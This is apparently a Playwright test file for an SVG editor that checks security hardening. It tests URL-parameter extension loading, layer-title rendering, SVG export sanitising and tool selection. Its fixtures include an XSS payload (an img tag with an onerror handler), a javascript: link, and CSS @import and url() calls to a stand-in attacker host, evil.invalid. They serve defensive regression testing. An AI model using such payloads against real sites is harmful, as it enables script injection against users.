import { test, expect } from './fixtures.js'
import { visitAndApproveStorage } from './helpers.js'

const waitForEditor = (page) => page.waitForFunction(
  () => window.svgEditor?.isReady === true && window.svgEditor.svgCanvas?.getMode?.(),
  null,
  { timeout: 20000 }
)

test.describe('Phase 0 security hardening', () => {
  test('S1: extPath cannot be set from the URL', async ({ page }) => {
    const externalRequests = []
    page.on('request', (request) => {
      if (new URL(request.url()).hostname === 'evil.invalid') externalRequests.push(request.url())
    })

    await page.goto('/index.html?extPath=https://evil.invalid/x')
    await waitForEditor(page)

    const extPath = await page.evaluate(() => window.svgEditor.configObj.curConfig.extPath)
    expect(extPath).not.toContain('evil.invalid')
    expect(externalRequests).toEqual([])
  })

  test('S2: layer names are shown as text in the context breadcrumb', async ({ page }) => {
    await visitAndApproveStorage(page)
    await page.evaluate(() => {
      const markup = '<svg xmlns="http://www.w3.org/2000/svg" width="640" height="480">' +
        '<g class="layer"><title>Calque &lt;img src=x onerror="window.__phase0Xss=1"&gt;</title>' +
        '<g id="grp"><rect x="10" y="10" width="50" height="50"/></g></g></svg>'
      window.svgEditor.svgCanvas.setSvgString(markup)
      window.svgEditor.svgCanvas.setContext(document.getElementById('grp'))
    })

    const panel = page.locator('#cur_context_panel')
    await expect(panel).toContainText('<img src=x')
    await expect(panel).toContainText('grp')
    expect(await panel.locator('img').count()).toBe(0)
    await page.waitForTimeout(300)
    expect(await page.evaluate(() => window.__phase0Xss)).toBeUndefined()
  })

  test('S3/S4: exported SVG keeps no javascript: link and no external CSS', async ({ page }) => {
    await visitAndApproveStorage(page)
    const exported = await page.evaluate(() => {
      const markup = '<svg xmlns="http://www.w3.org/2000/svg" width="640" height="480">' +
        '<g class="layer"><title>Layer 1</title>' +
        '<a href="javascript:void(window.__phase0Link=1)"><rect id="r1" x="10" y="10" width="50" height="50"/></a>' +
        '<style>@import url(https://evil.invalid/a.css); rect{fill:url(https://evil.invalid/t)}</style>' +
        '</g></svg>'
      window.svgEditor.svgCanvas.setSvgString(markup)
      return window.svgEditor.svgCanvas.getSvgString()
    })

    expect(exported).not.toContain('javascript:')
    expect(exported).not.toContain('evil.invalid')
    expect(exported).toContain('id="r1"')
    expect(exported).toContain('rect{fill:none}')
  })

  test('S6: initTool from the URL cannot click elements outside the tools panel', async ({ page }) => {
    await page.goto('/index.html?initTool=wireframe')
    await waitForEditor(page)
    await page.waitForFunction(() => window.svgEditor.svgCanvas.getMode() === 'select')

    expect(await page.locator('#workarea.wireframe').count()).toBe(0)
  })

  test('initTool from the URL still selects a drawing tool', async ({ page }) => {
    await page.goto('/index.html?initTool=rect')
    await waitForEditor(page)
    await page.waitForFunction(() => window.svgEditor.svgCanvas.getMode() === 'rect', null, { timeout: 10000 })
  })
})
